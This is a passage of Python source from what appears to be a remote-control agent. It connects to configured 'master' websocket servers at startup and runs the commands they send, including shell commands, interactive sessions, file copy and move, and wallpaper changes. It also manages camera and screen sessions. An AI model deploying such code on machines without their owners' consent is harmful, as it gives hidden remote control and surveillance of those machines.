                                                    proc.terminate(True)
                                                except Exception:
                                                    pass
                                            await asyncio.to_thread(_termpty)
                                        else:
                                            def _term():
                                                try:
                                                    proc.terminate()
                                                except Exception:
                                                    pass
                                            await asyncio.to_thread(_term)
                                    else:
                                        proc.terminate()
                                except Exception:
                                    pass
                            continue
                        if isinstance(data, dict) and data.get("type") == "wallpaper_set":
                            try:
                                style = data.get('style') if isinstance(data.get('style'), str) else None
                                # Resolve/save image first (supports path/url/data_url)
                                ok, img_path, err = await asyncio.to_thread(_save_image_from_payload_sync, data, current_agent_dir)
                                if not ok:
                                    await _send_line(ws, "error", f"[Wallpaper] {err}\n")
                                    continue
                                ok2, msg = await asyncio.to_thread(_set_wallpaper_local_sync, img_path, style)
                                if ok2:
                                    await _send_line(ws, "output", f"[Wallpaper] set: {img_path}\n")
                                else:
                                    await _send_line(ws, "error", f"[Wallpaper] {msg}\n")
                            except Exception as e:
                                await _send_line(ws, "error", f"[Wallpaper] failed: {e}\n")
                            continue
                        if isinstance(data, dict) and data.get("type") in ("fs_copy","fs_move"):
                            try:
                                op = 'copy' if data.get('type') == 'fs_copy' else 'move'
                                items = data.get('items') or []
                                if not isinstance(items, list) or not items:
                                    await _send_line(ws, "error", "[fs] No items provided\n")
                                else:
                                    src_dir = data.get('src_dir') or current_agent_dir
                                    dest_dir = data.get('dest_dir') or current_agent_dir
                                    overwrite = bool(data.get('overwrite'))
                                    ok, lines = await asyncio.to_thread(_fs_copy_move_sync, op, [str(x) for x in items], str(src_dir), str(dest_dir), overwrite)
                                    for ln in lines:
                                        await _send_line(ws, "output", ln + "\n")
                                    await _send_line(ws, "exit_code", 0 if ok else 1)
                            except Exception as e:
                                await _send_line(ws, "error", f"[fs] failed: {e}\n")
                            continue
                        cmd = data.get("command")
                        if cmd:
                            # If interactive is running, do not queue normal commands
                            if ws in interactive_sessions:
                                try:
                                    await _send_line(ws, "output", "[Interactive] Cannot run queued commands while interactive is active. Stop interactive first.\n")
                                except Exception:
                                    pass
                            else:
                                sid = None
                                try:
                                    sidv = data.get("session_id")
                                    if isinstance(sidv, str):
                                        sid = sidv
                                except Exception:
                                    sid = None
                                await enqueue_command(ws, cmd, sid)
                        # After any data, check interactive session completion
                        sess = interactive_sessions.get(ws)
                        if sess:
                            # Drain queue and forward to master
                            q: asyncio.Queue = sess.get("queue")
                            drained = True
                            while drained:
                                drained = False
                                try:
                                    item = q.get_nowait()
                                except asyncio.QueueEmpty:
                                    item = None
                                if item is not None:
                                    drained = True
                                    key, payload = item
                                    if key == "__done__":
                                        # Wait for both to finish
                                        # We don't count here; exit is detected by return code below
                                        pass
                                    else:
                                        try:
                                            await ws.send(json.dumps({key: payload}))
                                        except Exception:
                                            pass
                            # Check process exit non-blocking
                            proc = sess.get("proc")
                            code = None
                            try:
                                if os.name == 'nt':
                                    code = await asyncio.to_thread(proc.poll)
                                else:
                                    code = proc.returncode
                            except Exception:
                                pass
                            if code is not None:
                                try:
                                    await ws.send(json.dumps({"exit_code": int(code)}))
                                except Exception:
                                    pass
                                # Cleanup
                                for t in sess.get("tasks", []):
                                    try:
                                        t.cancel()
                                    except Exception:
                                        pass
                                interactive_sessions.pop(ws, None)
                finally:
                    # Clean up any queued commands for this master on disconnect
                    await _remove_queued_for_ws(ws)
                    # Kill any camera session tied to this ws
                    c_sess = camera_sessions.pop(ws, None)
                    if c_sess:
                        try:
                            c_sess["running"] = False
                            t = c_sess.get("task")
                            if t: t.cancel()
                        except Exception:
                            pass
                    # Kill any screen session tied to this ws
                    s_sess = screen_sessions.pop(ws, None)
                    if s_sess:
                        try:
                            s_sess["running"] = False
                            t = s_sess.get("task")
                            if t: t.cancel()
                        except Exception:
                            pass
                    # Kill any interactive session tied to this ws
                    sess = interactive_sessions.pop(ws, None)
                    if sess:
                        try:
                            proc = sess.get("proc")
                            if os.name == 'nt':
                                def _kill():
                                    try:
                                        if proc.poll() is None:
                                            proc.kill()
                                    except Exception:
                                        pass
                                await asyncio.to_thread(_kill)
                            else:
                                proc.kill()
                        except Exception:
                            pass
        except Exception as e:
            try:
                master_status[url] = False
            except Exception:
                pass
            now = time.time()
            if now - last_log >= 60:
                logging.error(f"Master connect failed ({url}): {e}")
                last_log = now
            await asyncio.sleep(retry_delay)

async def start_master_connections():
    global master_urls, master_tasks, master_stop
    try:
        master_urls = await asyncio.to_thread(_load_masters_sync)
    except Exception:
        master_urls = [u for u in DEFAULT_MASTER_URLS if isinstance(u, str) and u.strip()]
    if not master_urls:
        master_urls = [u for u in DEFAULT_MASTER_URLS if isinstance(u, str) and u.strip()]
    for u in master_urls:
        master_stop[u] = False
        master_tasks[u] = asyncio.create_task(_connect_one_master(u))

@app.on_event("startup")
async def _startup_connect_master():
    asyncio.create_task(start_master_connections())



